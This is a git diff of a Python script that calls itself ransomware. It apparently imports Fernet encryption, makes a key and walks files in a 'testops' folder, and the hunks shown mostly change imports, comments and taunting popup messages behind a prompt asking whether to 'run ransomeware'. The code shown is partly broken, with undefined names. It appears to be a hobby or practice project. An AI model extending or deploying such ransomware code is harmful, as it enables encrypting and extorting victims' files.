@@ -12,10 +12,11 @@ import glob
 from cryptography.fernet import Fernet
 import os
 import bckgrnd
-import win32ui, win32con
+import win32ui
+import win32con
 
 
-# FUNCTIONS #
+# Create Functions #
 
 # Create Key
 def write_key():
@@ -79,17 +80,19 @@ for file in glob.glob('testops\\**\*', recursive=True):
 
 """
 
-# Popup windows Function
+# Popup window Function
+
 def popup_Win():
     win_request = win32ui.MessageBox(" Today is your lucky day", win32con.MB_ICONASTERISK)
     win_request = win32ui.MessageBox("Having fun yet!", win32con.MB_YESNO)
     if response == win32con.IDYES:
-        win32ui.MessageBox("Today dosent look to lucky for you")
+        win32ui.MessageBox("Today dosen't look to lucky for you!")
     elif response == win32con.IDNO:
         win32ui.MessageBox(" Nice Try")
     
 
 # Run ransomeware window
+
 popup_Win = input("Do you want to run ransomeware")
 if (popup_Win == "y"):
     pop_up()
